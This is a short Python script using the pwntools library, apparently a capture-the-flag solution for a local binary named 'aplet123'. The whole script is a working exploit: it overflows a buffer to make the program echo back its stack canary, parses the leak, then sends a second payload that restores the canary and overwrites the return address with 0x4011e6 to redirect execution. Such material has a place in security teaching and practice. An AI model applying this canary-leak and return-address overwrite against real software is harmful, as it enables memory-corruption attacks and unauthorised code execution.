from pwn import *
import re
import struct

p = process('./aplet123')
#gdb.attach(p)
p.recv(1024)
pattern = re.compile(rb"hi (.*?),")

leak_payload = b"A"*69 + b"i'm"

p.sendline(leak_payload)
canary_leak = p.recv(1024)

print(canary_leak)

match = pattern.search(canary_leak)

print(match.group(1))

payload = b"A"*72 + b"\x00" + match.group(1) + b"B"*7 + p64(0x4011e6) #B*7 instead of 8 since an extra byte is read from the rbp space

p.sendline(payload)
p.sendline(b"bye")
print(p.clean(2))

